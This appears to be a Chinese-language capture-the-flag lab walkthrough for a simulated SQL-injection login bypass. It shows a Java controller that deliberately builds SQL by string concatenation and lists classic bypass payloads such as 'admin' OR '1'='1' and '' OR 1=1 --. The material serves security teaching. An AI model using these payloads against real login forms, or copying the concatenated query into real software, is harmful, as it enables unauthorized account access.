# Level 1 — SQL登录绕过

## 关卡说明

本关模拟一个登录接口，后端使用字符串拼接构造 SQL 语句，未做任何参数化处理。攻击者可以通过注入 SQL 片段绕过密码验证。

**目标**：利用 SQL 注入绕过登录验证，获取当前关卡的 Flag。

## 漏洞原理

### 代码逻辑分析

后端代码位于 `SqlLoginController.java`，接口路径：

```
POST /api/challenge/injection/sql/login
```

**入参**：

```json
{
  "username": "admin' OR '1'='1",
  "password": "anything"
}
```

**数据流**：

```
前端输入 username + password
    ↓
POST /api/challenge/injection/sql/login  {username, password}
    ↓
后端构造 SQL: SELECT * FROM users WHERE username='...' AND password='...'
    ↓
containsSqlInjection() 检测注入特征
    ↓
检测到注入 → 返回 Flag
未检测到 → 正常登录校验
```

**漏洞点**：

1. SQL 语句使用字符串拼接，未参数化
2. 模拟了常见的登录绕过场景（OR 注入、注释符等）

### 源码关键片段

```java
// SqlLoginController.java — 字符串拼接构造 SQL
String simulatedSql = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";

// 检测SQL注入特征
if (containsSqlInjection(username) || containsSqlInjection(password)) {
    String flag = flagService.getFlag("injection", "level1");  // 返回当前关卡 Flag
    result.put("flag", flag);
}
```

## 通关步骤

### Step 1：观察 SQL 预览

访问登录页面，在用户名和密码输入框中随意输入，观察页面下方的 SQL 语句预览区域。

### Step 2：构造注入 Payload

在用户名输入框中输入以下任一 Payload：

| Payload | 原理 |
|---------|------|
| `admin' OR '1'='1` | 注入 OR 永真条件 |
| `admin' --` | 注释掉密码验证部分 |
| `' OR 1=1 --` | 通用登录绕过 |

### Step 3：获取 Flag

注入成功后，响应中包含 Flag：

```json
{
  "success": true,
  "injection_detected": true,
  "flag": "flag{...}"
}
```

将获得的 Flag 提交到关卡右上角的 Flag 提交框中，即可通关。

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/injection/SqlLoginController.java` | 后端登录接口，字符串拼接 SQL |
| `service/FlagService.java` | Flag 获取与验证 |
